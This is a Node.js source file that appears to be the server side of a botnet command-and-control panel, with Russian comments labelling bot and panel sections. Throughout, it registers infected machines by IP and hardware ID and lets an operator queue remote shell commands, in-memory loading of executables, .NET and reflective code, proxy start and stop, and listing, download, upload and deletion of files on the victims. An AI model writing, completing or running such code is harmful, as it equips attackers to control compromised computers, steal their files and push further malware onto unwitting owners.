const { bots, queue } = require('./doh');
const io               = require('socket.io');

function initSockets(server) {
  const botsNs  = io(server).of('/bot');
  const panelNs = io(server).of('/panel');

  // Боты
  botsNs.on('connection', socket => {
    const { ip, hwid } = socket.handshake.query;
    if (!ip || !hwid) return socket.disconnect(true);

    bots[ip]  = bots[ip] || {};
    bots[ip].hwid     = hwid;
    bots[ip].lastSeen = Date.now();
    queue[hwid]       = queue[hwid] || [];
    socket.join(hwid);

    socket.on('shell_output', ({ output }) => {
      panelNs.emit('shell_output', { ip, output });
    });
    socket.on('payload_status', ({ status }) => {
      panelNs.emit('payload_status', { ip, status });
    });
  });

  // Панель
  panelNs.on('connection', socket => {
    socket.on('shell', ({ ip, cmd }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({
        cmd:  'run_shellcode',
        data: Buffer.from(cmd + '\n').toString('base64')
      }));
    });

    socket.on('payload', ({ ip, data }) => {
      const b = bots[ip];
      if (!b || !b.hwid) {
        return socket.emit('payload_status', { ip, status: 'unknown bot' });
      }
      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
      const b64 = buf.toString('base64');
      queue[b.hwid].push(JSON.stringify({ cmd: 'load_pe', data: b64 }));
      socket.emit('payload_status', { ip, status: 'queued' });
    });

    socket.on('load_dotnet', ({ ip, data }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({
        cmd: 'load_dotnet',
        data: Buffer.from(data).toString('base64')
      }));
      socket.emit('payload_status', { ip, status: 'queued' });
    });

    socket.on('exec_reflective', ({ ip, data }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({
        cmd:  'exec_reflective',
        data: Buffer.from(data).toString('base64')
      }));
      socket.emit('payload_status', { ip, status: 'queued' });
    });

    socket.on('start_proxy', ({ ip }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({ cmd: 'start_proxy' }));
    });
    socket.on('stop_proxy', ({ ip }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({ cmd: 'stop_proxy' }));
    });

    socket.on('list_dir', ({ ip, path }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({ cmd: 'list_dir', path }));
    });
    socket.on('file_get', ({ ip, path }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({ cmd: 'file_get', path }));
    });
    socket.on('file_put', ({ ip, path, data }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({
        cmd:  'file_put',
        path,
        data: Buffer.from(data).toString('base64')
      }));
    });
    socket.on('file_del', ({ ip, path }) => {
      const b = bots[ip];
      if (!b || !b.hwid) return;
      queue[b.hwid].push(JSON.stringify({ cmd: 'file_del', path }));
    });
  });
}

module.exports = { initSockets };
